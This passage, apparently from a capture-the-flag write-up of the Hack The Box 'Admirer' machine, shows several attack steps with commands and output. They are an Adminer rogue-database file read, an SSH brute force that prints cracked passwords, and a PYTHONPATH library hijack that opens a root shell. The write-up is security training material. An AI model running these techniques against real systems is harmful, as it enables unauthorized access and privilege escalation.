<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">1</span> <span class="k">row</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">show</span> <span class="n">databases</span>
    <span class="o">-&gt;</span> <span class="p">;</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="o">|</span> <span class="k">Database</span>           <span class="o">|</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="o">|</span> <span class="n">admirer</span>            <span class="o">|</span>
<span class="o">|</span> <span class="n">information_schema</span> <span class="o">|</span>
<span class="o">|</span> <span class="n">mysql</span>              <span class="o">|</span>
<span class="o">|</span> <span class="n">performance_schema</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="mi">4</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">000</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">create</span> <span class="k">user</span> <span class="s1">'test'</span> <span class="n">identified</span> <span class="k">by</span> <span class="s1">'test'</span><span class="p">;</span>
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">0</span> <span class="k">rows</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">000</span> <span class="n">sec</span><span class="p">)</span>
<span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">grant</span> <span class="k">all</span> <span class="k">on</span> <span class="o">*</span><span class="p">.</span><span class="o">*</span> <span class="k">to</span> <span class="s1">'test'</span><span class="p">;</span>
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">0</span> <span class="k">rows</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">000</span> <span class="n">sec</span><span class="p">)</span>
<span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">commit</span><span class="p">;</span>
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">0</span> <span class="k">rows</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">000</span> <span class="n">sec</span><span class="p">)</span>
<span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="n">use</span> <span class="n">admirer</span>
<span class="k">Database</span> <span class="n">changed</span>
<span class="n">MariaDB</span> <span class="p">[</span><span class="n">admirer</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">create</span> <span class="k">table</span> <span class="n">test</span><span class="p">(</span><span class="n">users</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">));</span>
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">0</span> <span class="k">rows</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">005</span> <span class="n">sec</span><span class="p">)</span>
<span class="n">MariaDB</span> <span class="p">[</span><span class="n">admirer</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">commit</span><span class="p">;</span>
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">0</span> <span class="k">rows</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">000</span> <span class="n">sec</span><span class="p">)</span>
<span class="n">MariaDB</span> <span class="p">[</span><span class="n">admirer</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">exit</span>
<span class="n">Bye</span>
<span class="n">root</span><span class="o">@</span><span class="n">kalimaa</span><span class="p">:</span><span class="o">~#</span> <span class="n">exit</span>
<span class="n">logout</span>
</pre></table></code></div></div><p>After creating the database and a table called <code class="language-plaintext highlighter-rouge">admirer</code>, I created a user named <code class="language-plaintext highlighter-rouge">test</code> and gave it full permissions to manage the database.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>zweilos@kali:/etc/mysql/mariadb.conf.d$ ls
50-client.cnf  50-mysql-clients.cnf  50-mysqld_safe.cnf  50-server.cnf
zweilos@kali:/etc/mysql/mariadb.conf.d$ sudo vim 50-server.cnf
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/5.5-config-file.png" alt="Changing the settings for mariadb" /></p><p>Next I had to set the binding for the server to the address <code class="language-plaintext highlighter-rouge">0.0.0.0</code> so that the external service could connect to it by my IP. The default is <code class="language-plaintext highlighter-rouge">127.0.0.1</code> which is localhost only.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>zweilos@kali:/etc/mysql/conf.d$ service mysql stop
zweilos@kali:/etc/mysql/conf.d$ service mysql start
</pre></table></code></div></div><p>After changing the server <code class="language-plaintext highlighter-rouge">bind-address</code> setting to <code class="language-plaintext highlighter-rouge">0.0.0.0</code> I had to restart the <code class="language-plaintext highlighter-rouge">mysql</code> service for it to take effect. After that I was able to login to my database in the Adminer portal.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/6-adminer-login%20%281%29.png" alt="Logging into the adminer portal" /></p><h3 id="finding-user-creds">Finding user creds</h3><p>This bug bounty write-up detailed what I needed to do next. Essentially, I logged into the remote server’s database management portal, but it was my own local database that I logged into. After that, I abused a feature of MySQL that allows for local files to be imported into the database. This is a type of local file inclusion (LFI) vulnerability.</p><ul><li><a href="https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f">https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f</a></ul><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="k">LOAD</span> <span class="k">DATA</span> <span class="k">LOCAL</span> <span class="n">INFILE</span> <span class="s1">'/etc/passwd'</span> 
<span class="k">INTO</span> <span class="k">TABLE</span> <span class="n">admirer</span><span class="p">.</span><span class="n">test</span>
<span class="n">FIELDS</span> <span class="n">TERMINATED</span> <span class="k">BY</span> <span class="nv">"</span><span class="se">\n</span><span class="nv">"</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/7-failed-local-inclusion%20%282%29%20%282%29%20%282%29%20%282%29%20%282%29%20%281%29.png" alt="The administrative portal being used to test for LFI" /></p><p>To test for the local file inclusion vulnerability I first tried to get <code class="language-plaintext highlighter-rouge">/etc/passwd</code> but was denied access to that file. Since I was fairly sure that this portal was still only running in the context of <code class="language-plaintext highlighter-rouge">www-data</code> I decided to try to get a file I knew I could access: <code class="language-plaintext highlighter-rouge">index.php</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/8-local-inclusion-success.png" alt="Successful attempt to include local files" /></p><p>I wasn’t even sure that this was going to work, but to my surprise it retrieved the file and added it to my database. I now had a way to read through the source code of the production website as opposed to the backups I downloaded earlier.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/9-yet-another-password.png" alt="Another password was found in the source code" /></p><p>Much to my surprise…there was yet again another password contained in this file. Before trying to download any more files I decided to try to brute force SSH login again with this new password.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>zweilos@kali:~/htb/admirer$ hydra -L users -P passwords 10.10.10.187 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-04 22:49:46
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 77 login tries (l:11/p:7), ~5 tries per task
[DATA] attacking ssh://10.10.10.187:22/
[22][ssh] host: 10.10.10.187   login: ftpuser   password: %n?4Wz}R$tTF7
[22][ssh] host: 10.10.10.187   login: waldo   password: &amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-04 22:50:00
</pre></table></code></div></div><p>I had finally found a usable password for <code class="language-plaintext highlighter-rouge">waldo</code>! I hoped that it wouldn’t just kick me out like it had with <code class="language-plaintext highlighter-rouge">ftpuser</code>.</p><h3 id="usertxt">User.txt</h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>zweilos@kali:~/htb/admirer$ ssh waldo@10.10.10.187
waldo@10.10.10.187's password: 
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3

waldo@admirer:~$ ls
user.txt
waldo@admirer:~$ cat user.txt
e9d47e5a8ef5972c07c9a8adb1a2af9a
</pre></table></code></div></div><p>Luckily it logged me right in, and I was able to collect my hard-earned loot!</p><h2 id="path-to-power-gaining-administrator-access">Path to Power (Gaining Administrator Access)</h2><h3 id="enumeration-as-user-waldo">Enumeration as user <code class="language-plaintext highlighter-rouge">waldo</code></h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>waldo@admirer:~<span class="nv">$ </span><span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>waldo<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>waldo<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>waldo<span class="o">)</span>,1001<span class="o">(</span>admins<span class="o">)</span>
admirer
waldo@admirer:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>waldo: 
Matching Defaults entries <span class="k">for </span>waldo on admirer:
    env_reset, <span class="nv">env_file</span><span class="o">=</span>/etc/sudoenv, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, <span class="nv">listpw</span><span class="o">=</span>always

User waldo may run the following commands on admirer:
    <span class="o">(</span>ALL<span class="o">)</span> SETENV: /opt/scripts/admin_tasks.sh
</pre></table></code></div></div><p>One of the first things I always do when gaining access to a new user is to check what privileges I have with <code class="language-plaintext highlighter-rouge">sudo -l</code>. I was pleasantly surprised to get a result back that I was able to do something with a bash script called <code class="language-plaintext highlighter-rouge">admin_tasks.sh</code>. I was curious about what this script did, and also what the group <code class="language-plaintext highlighter-rouge">admins</code> could access.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>waldo@admirer:~$ find / -group admins 2&gt;/dev/null
/opt/scripts
/opt/scripts/backup.py
/opt/scripts/admin_tasks.sh
</pre></table></code></div></div><p>Hmm…so the admins group only has access to this <code class="language-plaintext highlighter-rouge">scripts</code> folder. Time to check out the bash script.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

view_uptime<span class="o">()</span>
<span class="o">{</span>
    /usr/bin/uptime <span class="nt">-p</span>
<span class="o">}</span>

view_users<span class="o">()</span>
<span class="o">{</span>
    /usr/bin/w
<span class="o">}</span>

view_crontab<span class="o">()</span>
<span class="o">{</span>
    /usr/bin/crontab <span class="nt">-l</span>
<span class="o">}</span>

backup_passwd<span class="o">()</span>
<span class="o">{</span>
    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
    <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Backing up /etc/passwd to /var/backups/passwd.bak..."</span>
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        <span class="nb">echo</span> <span class="s2">"Done."</span>
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
    <span class="k">fi</span>
<span class="o">}</span>

backup_shadow<span class="o">()</span>
<span class="o">{</span>
    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
    <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Backing up /etc/shadow to /var/backups/shadow.bak..."</span>
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        <span class="nb">echo</span> <span class="s2">"Done."</span>
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
    <span class="k">fi</span>
<span class="o">}</span>

backup_web<span class="o">()</span>
<span class="o">{</span>
    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
    <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Running backup script in the background, it might take a while..."</span>
        /opt/scripts/backup.py &amp;
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
    <span class="k">fi</span>
<span class="o">}</span>

backup_db<span class="o">()</span>
<span class="o">{</span>
    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
    <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Running mysqldump in the background, it may take a while..."</span>
        <span class="c">#/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp;</span>
        /usr/bin/mysqldump <span class="nt">-u</span> root admirerdb <span class="o">&gt;</span> /var/backups/dump.sql &amp;
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
    <span class="k">fi</span>
<span class="o">}</span>

<span class="c"># Non-interactive way, to be used by the web interface</span>
<span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-eq</span> 1 <span class="o">]</span>
<span class="k">then
    </span><span class="nv">option</span><span class="o">=</span><span class="nv">$1</span>
    <span class="k">case</span> <span class="nv">$option</span> <span class="k">in
        </span>1<span class="p">)</span> view_uptime <span class="p">;;</span>
        2<span class="p">)</span> view_users <span class="p">;;</span>
        3<span class="p">)</span> view_crontab <span class="p">;;</span>
        4<span class="p">)</span> backup_passwd <span class="p">;;</span>
        5<span class="p">)</span> backup_shadow <span class="p">;;</span>
        6<span class="p">)</span> backup_web <span class="p">;;</span>
        7<span class="p">)</span> backup_db <span class="p">;;</span>

        <span class="k">*</span><span class="p">)</span> <span class="nb">echo</span> <span class="s2">"Unknown option."</span> <span class="o">&gt;</span>&amp;2
    <span class="k">esac

    </span><span class="nb">exit </span>0
<span class="k">fi</span>

<span class="c"># Interactive way, to be called from the command line</span>
<span class="nv">options</span><span class="o">=(</span><span class="s2">"View system uptime"</span>
         <span class="s2">"View logged in users"</span>
         <span class="s2">"View crontab"</span>
         <span class="s2">"Backup passwd file"</span>
         <span class="s2">"Backup shadow file"</span>
         <span class="s2">"Backup web data"</span>
         <span class="s2">"Backup DB"</span>
         <span class="s2">"Quit"</span><span class="o">)</span>

<span class="nb">echo
echo</span> <span class="s2">"[[[ System Administration Menu ]]]"</span>
<span class="nv">PS3</span><span class="o">=</span><span class="s2">"Choose an option: "</span>
<span class="nv">COLUMNS</span><span class="o">=</span>11
<span class="k">select </span>opt <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">options</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
    case</span> <span class="nv">$REPLY</span> <span class="k">in
        </span>1<span class="p">)</span> view_uptime <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        2<span class="p">)</span> view_users <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        3<span class="p">)</span> view_crontab <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        4<span class="p">)</span> backup_passwd <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        5<span class="p">)</span> backup_shadow <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        6<span class="p">)</span> backup_web <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        7<span class="p">)</span> backup_db <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        8<span class="p">)</span> <span class="nb">echo</span> <span class="s2">"Bye!"</span> <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>

        <span class="k">*</span><span class="p">)</span> <span class="nb">echo</span> <span class="s2">"Unknown option."</span> <span class="o">&gt;</span>&amp;2
    <span class="k">esac
done

</span><span class="nb">exit </span>0
</pre></table></code></div></div><p>This bash script seemed to be a completed version of the PHP version of admin-tasks I had seen earlier. Inside the script it references a few other files:</p><ul><li><code class="language-plaintext highlighter-rouge">/opt/scripts/backup.py</code><li><code class="language-plaintext highlighter-rouge">/srv/ftp/dump.sql</code> - <em>this is the one I found through the ftp server I think</em><li><code class="language-plaintext highlighter-rouge">/var/backups/dump.sql</code></ul><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>waldo@admirer:/opt/scripts<span class="nv">$ </span><span class="nb">sudo</span> ./admin_tasks.sh 

<span class="o">[[[</span> System Administration Menu <span class="o">]]]</span>
1<span class="o">)</span> View system <span class="nb">uptime
</span>2<span class="o">)</span> View logged <span class="k">in </span><span class="nb">users
</span>3<span class="o">)</span> View crontab
4<span class="o">)</span> Backup passwd file
5<span class="o">)</span> Backup shadow file
6<span class="o">)</span> Backup web data
7<span class="o">)</span> Backup DB
8<span class="o">)</span> Quit
Choose an option: 3
<span class="c"># Edit this file to introduce tasks to be run by cron.</span>
<span class="c"># </span>
<span class="c"># Each task to run has to be defined through a single line</span>
<span class="c"># indicating with different fields when the task will be run</span>
<span class="c"># and what command to run for the task</span>
<span class="c"># </span>
<span class="c"># To define the time you can provide concrete values for</span>
<span class="c"># minute (m), hour (h), day of month (dom), month (mon),</span>
<span class="c"># and day of week (dow) or use '*' in these fields (for 'any').# </span>
<span class="c"># Notice that tasks will be started based on the cron's system</span>
<span class="c"># daemon's notion of time and timezones.</span>
<span class="c"># </span>
<span class="c"># Output of the crontab jobs (including errors) is sent through</span>
<span class="c"># email to the user the crontab file belongs to (unless redirected).</span>
<span class="c"># </span>
<span class="c"># For example, you can run a backup of all your user accounts</span>
<span class="c"># at 5 a.m every week with:</span>
<span class="c"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span>
<span class="c"># </span>
<span class="c"># For more information see the manual pages of crontab(5) and cron(8)</span>
<span class="c"># </span>
<span class="c"># m h  dom mon dow   command</span>
<span class="k">*</span>/3 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="nb">rm</span> <span class="nt">-r</span> /tmp/<span class="k">*</span>.<span class="k">*</span> <span class="o">&gt;</span>/dev/null 2&gt;&amp;1
<span class="k">*</span>/3 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="nb">rm</span> /home/waldo/<span class="k">*</span>.p<span class="k">*</span> <span class="o">&gt;</span>/dev/null 2&gt;&amp;1
</pre></table></code></div></div><p>I ran the option for viewing the root crontab and noticed that it was set to clear out files every 3 minutes. It looked like putting files in <code class="language-plaintext highlighter-rouge">/tmp/</code> or files with an extension starting in <code class="language-plaintext highlighter-rouge">p</code> in <code class="language-plaintext highlighter-rouge">waldo</code>’s home directory would be a short-lived affair.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>waldo@admirer:/opt/scripts$ ls -la /var/backups/
total 6472
drwxr-xr-x  2 root root      4096 Sep 27 23:38 .
drwxr-xr-x 12 root root      4096 Nov 29  2019 ..
-rw-r--r--  1 root root     40960 Apr 22 11:32 alternatives.tar.0
-rw-r--r--  1 root root      2156 Nov 29  2019 alternatives.tar.1.gz
-rw-r--r--  1 root root     13080 Apr 16 13:29 apt.extended_states.0
-rw-r--r--  1 root root      1461 Nov 29  2019 apt.extended_states.1.gz
-rw-r--r--  1 root root       280 Nov 29  2019 dpkg.diversions.0
-rw-r--r--  1 root root       160 Nov 29  2019 dpkg.diversions.1.gz
-rw-r--r--  1 root root       160 Nov 29  2019 dpkg.diversions.2.gz
-rw-r--r--  1 root root       160 Nov 29  2019 dpkg.diversions.3.gz
-rw-r--r--  1 root root       160 Nov 29  2019 dpkg.diversions.4.gz
-rw-r--r--  1 root root       218 Nov 29  2019 dpkg.statoverride.0
-rw-r--r--  1 root root       188 Nov 29  2019 dpkg.statoverride.1.gz
-rw-r--r--  1 root root       188 Nov 29  2019 dpkg.statoverride.2.gz
-rw-r--r--  1 root root       188 Nov 29  2019 dpkg.statoverride.3.gz
-rw-r--r--  1 root root       188 Nov 29  2019 dpkg.statoverride.4.gz
-rw-r--r--  1 root root    422248 Apr 16 13:30 dpkg.status.0
-rw-r--r--  1 root root    128737 Apr 16 13:30 dpkg.status.1.gz
-rw-r--r--  1 root root    128737 Apr 16 13:30 dpkg.status.2.gz
-rw-r--r--  1 root root    123388 Dec  1  2019 dpkg.status.3.gz
-rw-r--r--  1 root root    122709 Nov 29  2019 dpkg.status.4.gz
-rw-r--r--  1 root root      3694 Sep 27 23:38 dump.sql
-rw-------  1 root root       840 Dec  2  2019 group.bak
-rw-------  1 root shadow     691 Dec  2  2019 gshadow.bak
-rw-r--r--  1 root root   5552679 Dec  4  2019 html.tar.gz
-rw-------  1 root root      1680 Dec  2  2019 passwd.bak
-rw-------  1 root shadow    1777 Apr 22 11:42 shadow.bak
</pre></table></code></div></div><p>I was also able to run the script to backup the SQL database, <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, and <code class="language-plaintext highlighter-rouge">/etc/shadow</code>. Unfortunately, each of the backup files were owned by <code class="language-plaintext highlighter-rouge">root</code> so I had no way to read them.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>backup_web<span class="o">()</span>
<span class="o">{</span>
    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
    <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Running backup script in the background, it might take a while..."</span>
        /opt/scripts/backup.py &amp;
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
    <span class="k">fi</span>
<span class="o">}</span>
</pre></table></code></div></div><p>The one function that looked a bit different from the others was the one that backed up the HTML files for the website. This one called a separate python script, which would also be run as root, so I decided to check it out as well.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span>

<span class="kn">from</span> <span class="nn">shutil</span> <span class="kn">import</span> <span class="n">make_archive</span>

<span class="n">src</span> <span class="o">=</span> <span class="s">'/var/www/html/'</span>

<span class="c1"># old ftp directory, not used anymore
#dst = '/srv/ftp/html'
</span>
<span class="n">dst</span> <span class="o">=</span> <span class="s">'/var/backups/html'</span>

<span class="n">make_archive</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s">'gztar'</span><span class="p">,</span> <span class="n">src</span><span class="p">)</span>
</pre></table></code></div></div><p>The file <code class="language-plaintext highlighter-rouge">/opt/scripts/backup.py</code> that the bash script referenced to do the web backup contained code that seemed potentially useful.</p><h3 id="setenv-and-sudo">SETENV and sudo</h3><p>I had an idea that since this python script was being run as root that maybe I could get it to read a file of my choice, however all of the files referenced in the python script has absolute paths so no no hijacking seemed possible there.</p><p>I did some research for <code class="language-plaintext highlighter-rouge">sudo setenv python</code> since I saw in my <code class="language-plaintext highlighter-rouge">sudo -l</code> output the word <code class="language-plaintext highlighter-rouge">SETENV</code> listed in front of the bash script I could run. In the search results was a very interesting article that talked about hijacking python library imports.</p><ul><li><a href="https://stackoverflow.com/questions/7969540/pythonpath-not-working-for-sudo-on-gnu-linux-works-for-root">https://stackoverflow.com/questions/7969540/pythonpath-not-working-for-sudo-on-gnu-linux-works-for-root</a> <a href="https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8">https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8</a></ul><blockquote><p>SCENARIO 3: Redirecting Python Library Search through PYTHONPATH Environment Variable</p><p>The PYTHONPATH environment variable indicates a directory (or directories), where Python can search for modules to import.</p><p>It can be abused if the user got privileges to set or modify that variable, usually through a script that can run with sudo permissions and got the SETENV tag set into /etc/sudoers file.</p></blockquote><p>This sounded exactly like the situation I had found.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">os</span>

<span class="k">def</span> <span class="nf">make_archive</span><span class="p">():</span>
    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'/bin/bash'</span><span class="p">)</span>
    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'echo I am g`whoami`'</span><span class="p">)</span>
</pre></table></code></div></div><p>Armed with this information, I wrote a short python library to replace the one referenced in the script. I named it <code class="language-plaintext highlighter-rouge">shutil.py</code> so the script would call it instead of the real one, and also made a function named <code class="language-plaintext highlighter-rouge">make_archive()</code> since this was what was specifically being imported. I wrote my function so that it would create a bash shell, and then echo my new username.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="n">waldo</span><span class="o">@</span><span class="n">admirer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">vi</span> <span class="n">shutil</span><span class="p">.</span><span class="n">py</span> 
<span class="n">waldo</span><span class="o">@</span><span class="n">admirer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">nano</span> <span class="n">shutil</span><span class="p">.</span><span class="n">py</span>
